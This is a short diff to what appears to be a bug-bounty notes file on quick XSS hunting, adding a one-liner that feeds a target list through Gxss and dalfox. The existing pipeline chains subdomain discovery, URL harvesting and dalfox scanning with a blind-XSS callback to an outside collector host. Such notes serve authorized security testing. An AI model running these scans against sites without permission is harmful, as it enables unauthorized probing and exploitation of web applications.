@@ -21,3 +21,7 @@ Quick search by XSS:
 ```
 subfinder -d TARGET.COM --silent | httpx-toolkit -silent | waybackurls | grep '=' | dalfox -b https://hahwul.xss.ht
 ```
+
+```
+cat alvo.txt | Gxss -p art | dalfox pipe --mining-dict /home/arthur/Tools/params.txt --skip-bav -o teste-xss.txt
+```
